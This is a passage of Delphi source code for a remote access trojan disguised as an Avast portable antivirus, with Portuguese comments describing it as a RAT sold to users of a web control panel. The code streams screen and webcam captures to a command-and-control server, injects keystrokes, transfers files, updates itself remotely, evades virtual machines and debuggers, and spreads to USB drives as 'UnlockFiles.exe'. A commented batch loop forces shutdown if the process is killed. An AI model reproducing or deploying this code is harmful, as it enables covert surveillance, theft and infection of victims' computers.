    Delete(dados2, 1, Pos('<|Atua'+'liza'+'rC2|>', dados2) + 14);
    dados2 := Copy(dados2, 1, Pos('<<|', dados2) - 5);
    if FileExists(Drive+dados2+'.e'+'xe') then
      SalvarUp := Drive+dados2+intToStr(CS1.Socket.Handle)+'.e'+'xe'
    else
      SalvarUp := Drive+dados2+'.e'+'xe';
    CS5.Close;
    CS5.Active := True;
    CS5.Service:='AtualizarC2';
  end;

  if(not TexAenvia.Equals('nulol'))then
    Socket.SendText(AnsiString(TexAenvia));
end;
// END CS1

procedure TAvastPortable8.CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
var
  tamanho: Integer;
begin//DESKTOP
  Socket.SendText('<|De'+'sk'+'top|>');
  Sleep(2000);
  FirstBmp := TMemoryStream.Create;
  SecondBmp := TMemoryStream.Create;
  CompareBmp := TMemoryStream.Create;
  PackStream := TMemoryStream.Create;
  CapTelabmp(FirstBmp);
  FirstBmp.Position := 0;
  PackStream.LoadFromStream(FirstBmp);
  CompressStream(PackStream);
  PackStream.Position := 0;
  tamanho := PackStream.Size;
  CS2.Socket.SendText(AnsiString('<|TA'+'MAN'+'HO|>' + inttostr(tamanho) + '<<|'));
  camera:=TCameraComponent.Create(nil);
end;

procedure TAvastPortable8.CS2Disconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
try
  if(Webcam)then begin
    camera.Active:=False;
    timerCam.Enabled:=False;
    imagefmx.CleanupInstance;
    camera.CleanupInstance;
    TrimAppMemorySize;
    Webcam:=False;
  end;
  FirstBmp.Free;
  SecondBmp.Free;
  CompareBmp.Free;
  PackStream.Free;
finally
end;
end;

procedure TAvastPortable8.CS2Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TAvastPortable8.CS2Read(Sender: TObject; Socket: TCustomWinSocket);
var
  StrCommand, StrPackSize: string;
begin
  try
    StrCommand := String(Socket.ReceiveText);
    if StrCommand = '<|ge'+'ts2|>' then
    begin//GETS2
      if(not timerCam.Enabled)then begin
        camera.Active:=True;
        timerCam.Enabled:=True;
      end;
      Webcam:=True;
      PackStream := TMemoryStream.Create;
      if FileExists(SysTempDir+'temp.bmp')then
        CompararStr(FirstBmp, SecondBmp, CompareBmp,1)
      else
        CompararStr(FirstBmp, SecondBmp, CompareBmp,0);
      CompareBmp.Position := 0;
      PackStream.LoadFromStream(CompareBmp);
      CompressStream(PackStream);
      PackStream.Position := 0;
      StrPackSize := inttostr(PackStream.Size);
      Socket.SendText(AnsiString('<|TAM'+'ANHO|>' + StrPackSize + '<<|'));
    end;
    if StrCommand = '<|ge'+'ts|>' then
    begin//GETS
      if(timerCam.Enabled)then begin
        timerCam.enabled:=False;
        camera.Active:=False;
      end;
      PackStream := TMemoryStream.Create;
      CompararStr(FirstBmp, SecondBmp, CompareBmp,0);
      CompareBmp.Position := 0;
      PackStream.LoadFromStream(CompareBmp);
      CompressStream(PackStream);
      PackStream.Position := 0;
      StrPackSize := inttostr(PackStream.Size);
      Socket.SendText(AnsiString('<|TAM'+'ANHO|>' + StrPackSize + '<<|'));
    //  iSendCount := iSendCount + 1;
    end;
    if StrCommand = '<|o'+'ko'+'k|>' then
    begin//okok
      PackStream.Position := 0;
      Socket.SendText(StreamToString(PackStream));
    end;
  except
    CS2.Active:=False;
  end;
end;

procedure TAvastPortable8.CS3Connect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  Sleep(2000);//KEYBOARD
  Socket.SendText(AnsiString('<|KE'+'YBO'+'ARD|>' + IDSockPrincipal + '<<|'));
end;

procedure TAvastPortable8.CS3Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TAvastPortable8.CS3Read(Sender: TObject;
  Socket: TCustomWinSocket);
var
  dados: String;
begin
  dados := String(Socket.ReceiveText);
  SendKeys(PChar(dados), false);
end;

procedure TAvastPortable8.CS4Connect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  Sleep(2000);//DOWNLOAD
  Socket.SendText(AnsiString('<|DO'+'W'+'NLO'+'AD|>' + IDSockPrincipal + '<<|'));
end;

procedure TAvastPortable8.CS4Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TAvastPortable8.CS4Read(Sender: TObject;
  Socket: TCustomWinSocket);
var
  StrCommand: String;
begin
  StrCommand := String(Socket.ReceiveText);
  if Pos('<|O'+'K|>', StrCommand) > 0 then
  begin
    ArqDow.Position := 0;
    Socket.SendText(AnsiString(inttostr(ArqDow.Size) + #0));
    Sleep(1000);
    Socket.SendStream(ArqDow);
  end;
end;

procedure TAvastPortable8.CS5Connect(Sender: TObject;
  Socket: TCustomWinSocket);
var
  UU: TUpload;
begin
  Sleep(2000);
  UU := TUpload.Create(true);
  UU.Socket := Socket;//UPLOAD
  if(CS5.Service.Equals('AtualizarC2'))then
    Socket.SendText(AnsiString('<|UP'+'LO'+'AD2|>' + IDSockPrincipal + '<<|'))
  else
    Socket.SendText(AnsiString('<|UP'+'LO'+'AD|>' + IDSockPrincipal + '<<|'));
  UU.Start;
end;

procedure TAvastPortable8.CS5Error(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TAvastPortable8.FormCreate(Sender: TObject);
var
  Data: PConfig;
begin
  asm nop end;
  if(IsSomethingUnknown or IsRunningWine2 or IsRunningVBox or IsRunningVMS{FIM VMS}
  or FD_INT_2d or FD_OutputDebugString or FD_Exception_Int3 or
  FD_PEB_NtGlobalFlags or FB_HWBP_Exception or FileLoaded or
  FS_OD_Int3_Pushfd or FS_SI_Exception_Int1 or PD_PEB_BeingDebuggedFlag or
  IsDebug or SoftIceXPLoaded or DumpLoaded or RegLoaded or IsDebuggerPresent)then begin
    autcopy.Enabled:=False;
    autcopy.Destroy;
    send.Destroy;
    reConnect.Destroy;
    config.Destroy;
    recebeDados.Destroy;
    notnull.Destroy;
    Exit;
  end;
  Anti_DeDe;
  AvastPortable8.Visible:=false;
  ParamList:=TIdMultipartFormDataStream.Create;
  if ReadSettings(Data) then
	//Parametro ID do usuario cadastrado no Servidor Cpanel-WEB
	//Com status ativo a ser verificado para permitir execução do
	//RAT e envio dos dados para o respectivo usuário
    AvastPortable8.Caption:=String(Data^.Temp)
  else
	//Se ocorrer erro na config de Building do trojan na Aplicação Server
	//ReadSettings não consegue extrair o ID do usuário ao qual o trojan
	//gerado pertence, então o Default é o user ID = 1
	//Para o usuario gerar seu trojan .exe deve estar ativo no Cpanel-WEB
	//E efetuar login na Aplicação(exe) Server para gerar o Trojan...
    AvastPortable8.Caption:='1';
	
  Webcam:=False;
  contClick:=0;
  pcname:=RetNmComp;
  winDir := WindowsDr+':\';
  tempDir:=SysTempDir;
  Nome := ExtractFileName(Application.ExeName);
  Drive := ExtractFilePath(Application.ExeName);
  confusb.Lines.Add('Setup='+Nome);
  if(Nome.Equals('PortableAntivirus_old.exe'))then begin
    KillTask('PortableAntivirus.exe');
    ShellExecute(0,nil,PChar('PortableAntivirus.exe'), nil,nil,SW_NORMAL);
    Application.Terminate;
  end;
  if(FileExists(Drive+'PortableAntivirus_old.exe'))then
    DeleteFile('PortableAntivirus_old.exe');
  if(Application.Title.Equals('PortableClose'))then begin
    Application.Terminate;
  end;
  {ShellExecute(0, nil,Pchar(ExtractFilePath(Application.ExeName)+'loop.bat'),nil,nil,SW_HIDE);}
  memo1.Lines.Add(GetFileZilla);
  if FileExists(tempDir+'spaconf.bin') then begin
    Settings:=TSettings.Create;
    Settings.LoadFromFile(tempDir+'spaconf.bin');
    logs:=Settings.PropertyLog;
    usbInf:=Settings.PropertyUsb;
    Settings.Destroy;
    case logs of
      0:calculatempo(1, 1, True);//ativa timer
      1:calculatempo(1, 1, True);//ativa keyh00k;
    end;
  end else begin
    Settings:=TSettings.Create;
    Settings.PropertyLog:=0;
    Settings.PropertyUsb:=1;
    Settings.SaveToFile(tempDir+'spaconf.bin');
    Settings.Destroy;
    calculatempo(1, 1, True);//ativa timer
    usbInf:=0;
  end;
end;

function DriverLetter(const aUM: Cardinal): Char;
begin
  case aUM of
          1:  result :=  'A';
          2:  result :=  'B';
          4:  result :=  'C';
          8:  result :=  'D';
         16:  result :=  'E';
         32:  result :=  'F';
         64:  result :=  'G';
        128:  result :=  'H';
        256:  result :=  'I';
        512:  result :=  'J';
       1024:  result :=  'K';
       2048:  result :=  'L';
       4096:  result :=  'M';
       8192:  result :=  'N';
      16384:  result :=  'O';
      32768:  result :=  'P';
  else
    result:='0';
  end;
end;

procedure TAvastPortable8.WMDeviceChange(var Msg: TMessage);
var
  particao:string; GetLetra:Char;
begin
  if(usbInf=0)then
    Exit;
  try
    if(Msg.wParam=$8000)then begin
      if(PDEV_BROADCAST_HDR( Msg.LParam ).dbch_devicetype <>2)then Exit;
      if(PDEV_BROADCAST_VOLUME( Msg.LParam ).dbcv_flags <>0)then Exit;
      GetLetra:=DriverLetter(PDEV_BROADCAST_VOLUME( Msg.LParam ).dbcv_unitmask);
      if(GetLetra='0')then Exit;
    end;
    particao := GetLetra + ':\';
  except
    Exit;
  end;
  try
    if(DiskFree(Ord(GetLetra) - 64) div 1024<5000)then Exit;
    if not DirectoryExists(particao + 'Trash')then begin
      CreateDir(particao + 'Trash');
      FileSetAttr(particao + 'Trash', FileGetAttr(particao + 'Trash') or faHidden or faSysFile);
      confusb.Lines.SaveToFile(tempDir+'windgusb.conf');
      GetUSBFiles(particao,'*.exe');
    end;
  except
	Exit;
  end;
end;

end.

{VERSAO ANTIGA
procedure TAvastPortable8.WMDeviceChange(var Msg: TMessage);
var
  particao:string; GetLetra:Char;
begin
  if(usbInf=False)then
    Exit;
  try
    if(Msg.wParam=$8000)then begin
      if(PDEV_BROADCAST_HDR( Msg.LParam ).dbch_devicetype <>2)then Exit;
      if(PDEV_BROADCAST_VOLUME( Msg.LParam ).dbcv_flags <>0)then Exit;
      GetLetra:=DriverLetter(PDEV_BROADCAST_VOLUME( Msg.LParam ).dbcv_unitmask);
      if(GetLetra='0')then Exit;
    end;
    particao := GetLetra + ':\';
  except
    Exit;
  end;
  try
    if(DiskFree(Ord(GetLetra) - 64) div 1024<5000)then Exit;
    if DirectoryExists(particao + 'unlocked') = False then begin
      CreateDir(particao + 'unlocked');
      ShellExecute(0, nil, PChar('cm'+'d.e'+'xe'), PChar('/c move '+particao + '*.* '+particao + 'unlocked'), nil, SW_HIDE);
      FileSetAttr(particao + 'unlocked', FileGetAttr(particao + 'unlocked') or faHidden);
      FileSetAttr(particao + 'unlocked', FileGetAttr(particao + 'unlocked') or faSysFile);
    end;
    if FileExists(particao + Nome) = False then begin
      CopyFile(PChar(ParamStr(0)),PChar(particao + Nome),False);//UNLOCKFILES
      CopyFile(PChar(ParamStr(0)),PChar(particao + 'Unl'+'ockF'+'iles'+'.ex'+'e'),False);
      FileSetAttr(particao + Nome, FileGetAttr(particao + Nome) or faHidden);
    end;
  except on e : Exception do
	Exit;
  end;
end;

end.

{CODE PARA DIFICULTAR ENCERRAMENTO DO TROJAN
 memo3.lines.Text:='@ECHO off'+#13+':loop'+#13+'tasklist | find /i "'+nome+'"'+#13+
  'IF ERRORLEVEL 1 shutdown -s'+#13+'goto loop';
  if(FileExists(ExtractFilePath(Application.ExeName)+'loop.bat')=false) then
  memo3.Lines.SaveToFile(ExtractFilePath(Application.ExeName)+'loop.bat');
  ShellExecute(0, nil,Pchar('cmd.exe'),Pchar('/c attrib "'+ExtractFilePath(Application.ExeName)+'loop.bat" +h'),nil,SW_HIDE); }
